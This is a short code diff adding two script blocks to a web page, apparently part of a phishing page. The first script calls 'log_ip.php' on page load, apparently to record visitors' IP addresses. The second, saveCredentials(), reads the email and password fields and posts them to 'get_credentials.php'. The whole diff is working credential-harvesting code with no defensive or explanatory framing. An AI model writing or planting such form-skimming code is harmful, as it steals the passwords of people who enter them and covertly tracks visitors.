@@ -1,0 +1,20 @@
+<script>
+    fetch('log_ip.php')
+        .then(response => response.text())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
+</script>
+<script>
+    function saveCredentials() {
+        var username = document.getElementById('inputEmailfield').value;
+        var password = document.getElementById('inputPasswordfield').value;
+
+        var formData = new FormData();
+        formData.append('inputEmailfield', username);
+        formData.append('inputPasswordfield', password);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'get_credentials.php', true);
+        xhr.send(formData);
+    }
+</script>
